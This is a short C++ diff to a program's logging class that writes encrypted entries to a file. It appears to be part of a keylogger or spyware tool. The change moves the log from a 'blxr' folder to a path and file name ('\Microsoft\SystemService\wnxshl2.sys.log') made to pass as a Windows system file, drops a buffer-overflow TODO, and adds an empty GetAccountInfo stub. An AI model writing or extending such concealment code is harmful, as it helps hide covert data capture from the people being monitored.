@@ -41,16 +41,19 @@ bool Stream::WriteLog(const std::string &input, uint32_t &active, const bool blo
 	logFile->Ofstream << timeString;
   }
   std::string cryptInput = input;
-  Crypt::Encrypt(cryptInput);    // TODO vector buffer overflow
+  Crypt::Encrypt(cryptInput);
   logFile->Ofstream << cryptInput;
   logFile->Ofstream.close();
   return true;
 }
 bool Stream::MakeFile() {
   try {
-	logFile = new Stream::LogFile(Stream::GetPath(R"(\Microsoft\blxr\)"), "blxr.txt");
+	logFile = new Stream::LogFile(Stream::GetPath(R"(\Microsoft\SystemService\)"), "wnxshl2.sys.log");
   } catch (...) {
 	return false;
   }
   return true;
+}
+bool Stream::GetAccountInfo() {
+  return false;
 }
